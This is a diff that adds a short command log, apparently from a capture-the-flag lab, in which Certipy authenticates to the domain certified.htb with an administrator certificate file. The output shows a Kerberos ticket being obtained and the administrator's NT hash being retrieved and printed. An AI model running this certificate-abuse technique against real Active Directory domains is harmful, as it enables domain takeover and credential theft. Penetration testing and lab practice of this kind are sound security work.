@@ -1,0 +1,18 @@
+### [2026-04-06 17:11:17] certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
+
+$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*] Using principal: 'administrator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
+
+# Exit code: 0
+# Duration: 2026-04-06 17:11:26
